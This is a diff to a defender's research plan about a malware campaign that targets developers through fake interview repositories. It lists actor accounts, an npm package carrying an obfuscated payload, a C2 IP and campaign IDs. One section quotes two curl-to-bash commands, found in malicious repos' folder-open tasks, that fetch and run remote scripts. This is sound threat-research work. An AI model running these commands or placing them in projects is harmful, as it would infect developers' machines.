@@ -610,6 +610,51 @@ Goals:
 Method: Instrument the generator-function executor to trace its output; or statically reduce
 the `while`+`switch` dispatch loop to recover execution order, then extract string table.
 
+**AC. BestCity actor-staging cluster — deep dive**
+Task V found four repos (`technoknol/bestcity`, `fullstackragab/bestcity`, `BestCity-v1/Demo-v1`,
+`AbstractFruitFactory/bestcity-demo`) that appear to be **actor-controlled fake-company repos**
+used as interview material. The `technoknol/bestcity` payload is 55,985 bytes — far larger than
+a typical Stage 0 (~5KB), suggesting an embedded full-stage payload rather than a blockchain
+fetcher. Goals:
+1. Decode the 55,985-byte WJS IIFE payload from `technoknol/bestcity` — what stage(s) is it?
+   Does it contain blockchain dead-drop logic, or serve Stage 2 directly?
+2. Profile the actor accounts: `technoknol`, `fullstackragab`, `BestCity-v1`, `AbstractFruitFactory`
+   — creation dates, other repos, linked identities, commit authorship
+3. Check if `bestcity` repos are still live and whether payload has been updated recently
+4. Determine whether `fa-brands-regular.woff2` and `fa-solid-400.woff2` in the bestcity cluster
+   are different campaign generations (the brands variant used simpler command syntax)
+5. Cross-reference any commit emails or author names to link actor accounts
+
+**AD. `jsonwebauth` npm package — payload analysis**
+Task V surfaced `jsonwebauth` (published 2026-01-08) from Abstract Security's report.
+It contains a 326KB obfuscated payload in `lib/lserver.js`. Goals:
+1. Pull the package from npm registry (if still live) or npm archive
+2. Identify cipher/obfuscation — is it `_$_1e42` or a different variant?
+3. Extract C2 endpoints — does it beacon to our known IPs or different infrastructure?
+4. Check publisher account on npm for other malicious packages
+5. Determine whether this is PolinRider/ChainVeil or a separate Contagious Interview operator
+
+**AE. `regioncheck.xyz` / Vercel cluster — separate actor investigation**
+Task V found repos using `folderOpen` with curl-to-bash delivery instead of font-file payloads.
+This is a distinct campaign from PolinRider, but targeting the same developer community.
+- `ta3pks/Decentralized-Social`: `curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash`
+- `dmbruno/card-activity`: `curl 'https://codeviewer-three.vercel.app/task/mac?token=6df937fe9011' | sh`
+- Abstract Security also documents `vscodeconfig.com` and `vscode-load.onrender.com`
+Goals:
+1. Check if `regioncheck.xyz` is still live — what does `/settings/mac?flag=8` return?
+2. Is this the same actor as PolinRider (shared infra, shared TTP) or a copycat?
+3. Check the `ta3pks` repo for additional stages — the command continues `nohup node .vsc...`
+4. Enumerate additional repos in this cluster via GitHub search for `regioncheck.xyz` in tasks.json
+
+**AF. Campaign ID `10-010` — routing and operator identification**
+`madeeldev/flutter-vpn` has `global['!']='10-010'` — a numeric-with-hyphen campaign ID that
+doesn't match the `5-X-Y` or `A-...` patterns of known campaigns. The Stage 2 routing in
+`_$_b229` sends numeric IDs to `198.105.127.210/$/boot`. Goals:
+1. Confirm how `10-010` routes in the current Stage 2 — does the `10` prefix match any routing
+   branch, or is it handled as a numeric ID?
+2. Search for other repos with `10-0` prefix campaign IDs — is this a separate operator batch?
+3. Check whether `madeeldev` is a single targeted developer or part of a larger cluster
+
 **L. Investigate bat-file victim repos** — DONE
 Full analysis in `ANALYSIS_BAT_VICTIMS.md`. 29 repos scanned (8 config.bat + 21 temp_interactive).
 7 live infections found, all `_$_1e42` cipher with NEW activation/return pair **2509/1358**
